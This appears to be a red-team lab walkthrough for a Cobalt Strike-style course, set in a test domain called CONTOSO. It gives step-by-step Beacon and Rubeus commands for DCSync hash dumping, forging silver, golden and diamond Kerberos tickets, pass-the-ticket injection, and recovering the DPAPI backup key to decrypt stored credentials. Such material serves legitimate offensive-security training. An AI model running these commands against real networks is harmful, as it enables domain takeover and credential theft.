## DCSync

From the medium integrity Beacon:

1.  Impersonate a domain admin.
    
    1. make_token CONTOSO\dyork Passw0rd!
2.  Run dcsync to obtain the domain's krbtgt hash.
    
    1. dcsync contoso.com CONTOSO\krbtgt
3.  To obtain the hash of a computer account, remember to include the $ in the username.
    
    1. dcsync contoso.com CONTOSO\lon-db-1$
4.  Drop the impersonation.
    
    1. rev2self

## Silver Ticket

1.  On the Attacker Desktop, use the AES256 hash of _lon-db-1_ to forge a silver ticket for the cifs service.
    
    TerminalTypeCopy
    
    `C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256:[HASH] /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap`
    

From the high-integrity Beacon:

1.  Create a new sacrificial logon session for the impersonated user.
    
    1. make_token CONTOSO\Administrator FakePass
2.  Inject the silver ticket into this logon session.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET]`
    
3.  Verify the ticket has been injected.
    
    1. run klist
4.  List the target's C$ drive.
    
    1. ls \\lon-db-1\c$
5.  Purge the ticket cache.
    
    1. run klist purge


## Golden Ticket

1.  On the Attacker Desktop, use the krbtgt's AES256 hash to forge a golden ticket for the default domain administrator.
    
    TerminalTypeCopy
    
    `C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:[HASH] /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap`
    
2.  Inject the golden ticket into the sacrificial logon session on the high-integrity Beacon.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET]`
    
3.  Verify the ticket has been injected.
    
    1. run klist
4.  List the target's C$ drive.
    
    1. ls \\lon-dc-1\c$
5.  Purge the ticket cache.
    
    1. run klist purge

## Diamond Ticket

1.  From the medium-integrity Beacon, use the krbtgt's AES256 hash to create a diamond ticket for the default domain administrator.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:[HASH] /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap`
    
2.  Inject the golden ticket into the sacrificial logon session on the high-integrity Beacon.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET]`
    
3.  Verify the ticket has been injected.
    
    1. run klist
4.  List the target's C$ drive.
    
    1. ls \\lon-dc-1\c$


## DPAPI Backup Key

1.  From the medium-integrity Beacon, impersonate a domain admin again.
    
    1. make_token CONTOSO\dyork Passw0rd!
2.  Recover the domain's backup DPAPI key.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey`
    
3.  Drop the impersonation.
    
    1. rev2self
4.  Use the key to decrypt credentials stored in the Credential Manager.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:[KEY]`